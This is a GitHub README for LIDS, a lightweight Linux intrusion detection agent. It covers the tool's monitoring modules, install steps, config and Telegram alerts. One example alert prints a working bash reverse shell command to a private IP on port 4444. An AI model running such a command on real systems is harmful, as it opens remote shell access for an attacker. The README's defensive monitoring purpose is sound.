<p align="center">
<img src="https://img.shields.io/github/stars/Yescrypt/lids?style=for-the-badge">
<img src="https://img.shields.io/github/forks/Yescrypt/lids?style=for-the-badge">
<img src="https://img.shields.io/github/issues/Yescrypt/lids?style=for-the-badge">
<img src="https://img.shields.io/github/license/Yescrypt/lids?style=for-the-badge">
<img src="https://img.shields.io/github/v/release/Yescrypt/lids?style=for-the-badge">
</p>

<div align="center">

# 🛡️ LIDS

## Linux Intrusion Detection System

**Real-time attack detection · Telegram alerts**

Lightweight host-based security monitoring agent for  
**Kali Linux · Parrot OS · Arch Linux**

<br>

<table>
<tr>
<td align="center" width="120">
<img src="https://skillicons.dev/icons?i=python" width="48"><br>
<b>Python</b>
</td>
<td align="center" width="120">
<img src="https://skillicons.dev/icons?i=linux" width="48"><br>
<b>Linux</b>
</td>
<td align="center" width="120">
<img src="https://cdn.simpleicons.org/opensourceinitiative/3DA639" width="48"><br>
<b>MIT</b>
</td>
</tr>
</table>

</div>

---

## Features

| Module | What it detects |
|------|------|
| **Port Monitor** | New ports opened, suspicious ports (4444,1337 etc.) |
| **SSH Monitor** | Weak SSH configs, root login, password auth |
| **Log Monitor** | Brute force attacks, login abuse |
| **Backdoor Scanner** | Reverse shells, cron persistence |
| **Process Monitor** | Cryptominers, suspicious binaries |
| **Malware Scan** | rkhunter / chkrootkit integration |
| **Firewall Control** | Block IP with iptables / ufw |
| **Telegram Alerts** | Real-time attack notifications |

---

## Install

```bash
git clone https://github.com/Yescrypt/lids
cd lids
sudo bash install.sh
```

Installer asks:

- Hostname label  
- OS name  
- Telegram User ID  

LIDS then registers and starts monitoring.

---

## Telegram Alert Example

```
🚨 SSH Brute Force Attack

Host: kali-lab
IP: 185.x.x.x
Attempts: 32

[🚫 BLOCK IP] [🔍 WHOIS] [IGNORE]
```

```
🚨 Reverse Shell Detected

PID: 2211
CMD: bash -i >& /dev/tcp/192.168.1.5/4444

[KILL] [TRACE] [IGNORE]
```

---

## Config

`/etc/lids/lids.conf`

```json
{
  "scan_interval": 30,
  "whitelist_ports": [22,80,443],
  "whitelist_processes": ["nmap","netcat"],
  "whitelist_ips": []
}
```

---

## Commands

```bash
systemctl status lids
systemctl restart lids
tail -f /var/log/lids/lids.log
```

---

## Security

Report vulnerabilities responsibly:

@anonim_xatbot

---

## License

MIT License © 2026 LIDS Contributors  
See the [LICENSE](LICENSE) file for details.